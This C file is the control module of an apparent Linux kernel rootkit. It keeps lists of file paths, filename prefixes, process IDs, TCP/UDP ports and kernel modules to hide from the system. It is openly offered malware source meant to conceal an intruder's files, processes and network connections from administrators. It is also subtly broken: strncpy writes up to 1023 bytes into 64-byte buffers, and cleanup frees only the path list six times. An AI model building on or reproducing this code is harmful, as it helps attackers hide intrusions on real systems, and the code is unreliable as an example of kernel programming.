/*
 * This file manages the data structures used for determining
 * which files, processes, modules, sockets, ... need to be hidden.
 */
#include <linux/slab.h>

#include "include.h"

/* list for hidden files (full path) */
struct file_name {
	struct list_head list;
	char name[1024];
};

/* list for hidden files (by prefix) */
struct file_prefix {
	struct list_head list;
	char name[64];
};

/* list for hidden processes (by pid) */
struct process {
	struct list_head list;
	pid_t pid;
};

/* list for hidden tcp sockets (by port) */
struct tcp_socket {
	struct list_head list;
	int port;
};

/* list for hidden udp sockets (by port) */
struct udp_socket {
	struct list_head list;
	int port;
};

/* list for hidden kernel modules (by module name) */
// TODO: think of a better way to store hidden modules
struct modules {
	struct list_head list;
	char name[64];
}; 

static struct list_head paths;
static struct list_head prefixes;
static struct list_head processes;
static struct list_head tcp_sockets;
static struct list_head udp_sockets;
static struct list_head modules;

int
is_path_hidden(char *name)
{
	struct file_name *cur;
	struct list_head *cursor;
	
	if(name == NULL) {
		return 0;
	}
		
	list_for_each(cursor, &paths) {
		cur = list_entry(cursor, struct file_name, list);
		if(strcmp(cur->name, name) == 0) {
			return 1;
		}
	}

	return 0;
}

int
hide_file_path(char *name)
{
	struct file_name *new;

	if(strlen(name) > 1023) {
		return -EINVAL;
	}
	
	if(is_path_hidden(name)) {
		return -1;	// TODO: better error code
	}

	new = kmalloc(sizeof(struct file_name), GFP_KERNEL);
	if(new == NULL) {
		return -ENOMEM;
	}
	
	strncpy(new->name, name, 1023);

	list_add(&new->list, &paths);
	
	return 0;
}

int
unhide_file_path(char *name)
{
	struct file_name *cur;
	struct list_head *cursor, *next;
	list_for_each_safe(cursor, next, &paths) {
		cur = list_entry(cursor, struct file_name, list);
		if(strcmp(cur->name, name) == 0) {
			list_del(cursor);
			kfree(cur);
			return 0;
		}
	}

	
	return -EINVAL;
}

int
is_prefix_hidden(char *name)
{
	struct file_prefix *cur;
	struct list_head *cursor;
	
	if(name == NULL) {
		return 0;
	}
		
	list_for_each(cursor, &prefixes) {
		cur = list_entry(cursor, struct file_prefix, list);
		if(strcmp(cur->name, name) == 0) {
			return 1;
		}
	}

	return 0;
}

int
hide_file_prefix(char *name)
{
	struct file_prefix *new;

	if(strlen(name) > 63) {
		return -EINVAL;
	}
	
	if(is_prefix_hidden(name)) {
		return -1;	// TODO: better error code
	}

	new = kmalloc(sizeof(struct file_prefix), GFP_KERNEL);
	if(new == NULL) {
		return -ENOMEM;
	}
	
	strncpy(new->name, name, 1023);

	list_add(&new->list, &prefixes);
	
	return 0;
}

int
unhide_file_prefix(char *name)
{
	struct file_prefix *cur;
	struct list_head *cursor, *next;
	list_for_each_safe(cursor, next, &prefixes) {
		cur = list_entry(cursor, struct file_prefix, list);
		if(strcmp(cur->name, name) == 0) {
			list_del(cursor);
			kfree(cur);
			return 0;
		}
	}

	return -EINVAL;
}

int
is_process_hidden(pid_t pid)
{
	struct process *cur;
	struct list_head *cursor;

	list_for_each(cursor, &processes) {
		cur = list_entry(cursor, struct process, list);
		if(cur->pid == pid) {
			return 1;
		}
	}

	return 0;
}

int
hide_process(pid_t pid)
{
	struct process *new;
	
	if(is_process_hidden(pid)) {
		return -1;	// TODO: better error code
	}

	new = kmalloc(sizeof(struct process), GFP_KERNEL);
	if(new == NULL) {
		return -ENOMEM;
	}
	
	new->pid = pid;

	list_add(&new->list, &processes);
	
	return 0;
}

int
unhide_process(pid_t pid)
{
	struct process *cur;
	struct list_head *cursor, *next;
	list_for_each_safe(cursor, next, &processes) {
		cur = list_entry(cursor, struct process, list);
		if(cur->pid == pid) {
			list_del(cursor);
			kfree(cur);
			return 0;
		}
	}

	
	return -EINVAL;
}

int
is_tcp_socket_hidden(int port)
{
	struct tcp_socket *cur;
	struct list_head *cursor;
	
	list_for_each(cursor, &tcp_sockets) {
		cur = list_entry(cursor, struct tcp_socket, list);
		if(cur->port == port) {
			return 1;
		}
	}

	return 0;
}

int
hide_tcp_socket(int port) 
{
	struct tcp_socket *new;
	
	if(is_tcp_socket_hidden(port)) {
		return -1;	// TODO: better error code
	}

	new = kmalloc(sizeof(struct tcp_socket), GFP_KERNEL);
	if(new == NULL) {
		return -ENOMEM;
	}
	
	new->port = port;

	list_add(&new->list, &tcp_sockets);
	
	return 0;
}

int
unhide_tcp_socket(int port)
{
	struct tcp_socket *cur;
	struct list_head *cursor, *next;
	list_for_each_safe(cursor, next, &tcp_sockets) {
		cur = list_entry(cursor, struct tcp_socket, list);
		if(cur->port == port) {
			list_del(cursor);
			kfree(cur);
			return 0;
		}
	}

	
	return -EINVAL;
}

int
is_udp_socket_hidden(int port)
{
	struct udp_socket *cur;
	struct list_head *cursor;
	
	list_for_each(cursor, &udp_sockets) {
		cur = list_entry(cursor, struct udp_socket, list);
		if(cur->port == port) {
			return 1;
		}
	}

	return 0;
}

int
hide_udp_socket(int port)
{
	struct udp_socket *new;
	
	if(is_udp_socket_hidden(port)) {
		return -1;	// TODO: better error code
	}

	new = kmalloc(sizeof(struct udp_socket), GFP_KERNEL);
	if(new == NULL) {
		return -ENOMEM;
	}
	
	new->port = port;

	list_add(&new->list, &udp_sockets);
	
	return 0;
}

int
unhide_udp_socket(int port)
{
	struct udp_socket *cur;
	struct list_head *cursor, *next;
	list_for_each_safe(cursor, next, &udp_sockets) {
		cur = list_entry(cursor, struct udp_socket, list);
		if(cur->port == port) {
			list_del(cursor);
			kfree(cur);
			return 0;
		}
	}

	
	return -EINVAL;
}

int
is_module_hidden(char *name)
{
	struct modules *cur;
	struct list_head *cursor;
	
	if(name == NULL) {
		return 0;
	}
		
	list_for_each(cursor, &modules) {
		cur = list_entry(cursor, struct modules, list);
		if(strcmp(cur->name, name) == 0) {
			return 1;
		}
	}

	return 0;
}

int
hide_module(char *name)
{
	// TODO actually hide the module

	struct modules *new;

	if(strlen(name) > 63) {
		return -EINVAL;
	}
	
	if(is_module_hidden(name)) {
		return -1;	// TODO: better error code
	}

	new = kmalloc(sizeof(struct modules), GFP_KERNEL);
	if(new == NULL) {
		return -ENOMEM;
	}
	
	strncpy(new->name, name, 1023);

	list_add(&new->list, &modules);
	
	return 0;
}

int
unhide_module(char *name)
{
	// TODO actually unhide the module

	struct modules *cur;
	struct list_head *cursor, *next;
	list_for_each_safe(cursor, next, &modules) {
		cur = list_entry(cursor, struct modules, list);
		if(strcmp(cur->name, name) == 0) {
			list_del(cursor);
			kfree(cur);
			return 0;
		}
	}

	return -EINVAL;
}

void
initialize_control(void)
{
	ROOTKIT_DEBUG("Initializing control datastructures...\n");

	INIT_LIST_HEAD(&paths);
	INIT_LIST_HEAD(&prefixes);
	INIT_LIST_HEAD(&processes);
	INIT_LIST_HEAD(&tcp_sockets);
	INIT_LIST_HEAD(&udp_sockets);
	INIT_LIST_HEAD(&modules);

	ROOTKIT_DEBUG("Done.\n");
}

void
cleanup_control(void)
{
	ROOTKIT_DEBUG("Cleaning up control datastructues...\n");

	struct list_head *cursor, *next;
	struct file_name *name;
	struct file_prefix *prefix;
	struct process *process;
	struct tcp_socket *tcp;
	struct udp_socket *udp;
	struct modules *module;
	
	cursor = next = NULL;
	list_for_each_safe(cursor, next, &paths) {
		name = list_entry(cursor, struct file_name, list);
		list_del(cursor);
		kfree(name);
	}
	
	cursor = next = NULL;
	list_for_each_safe(cursor, next, &paths) {
		prefix = list_entry(cursor, struct file_prefix, list);
		list_del(cursor);
		kfree(prefix);
	}
	
	cursor = next = NULL;
	list_for_each_safe(cursor, next, &paths) {
		process = list_entry(cursor, struct process, list);
		list_del(cursor);
		kfree(process);
	}
	
	cursor = next = NULL;
	list_for_each_safe(cursor, next, &paths) {
		tcp = list_entry(cursor, struct tcp_socket, list);
		list_del(cursor);
		kfree(tcp);
	}
	
	cursor = next = NULL;
	list_for_each_safe(cursor, next, &paths) {
		udp = list_entry(cursor, struct udp_socket, list);
		list_del(cursor);
		kfree(udp);
	}
	
	cursor = next = NULL;
	list_for_each_safe(cursor, next, &paths) {
		module = list_entry(cursor, struct modules, list);
		list_del(cursor);
		kfree(module);
	}

	ROOTKIT_DEBUG("Done.\n");
}
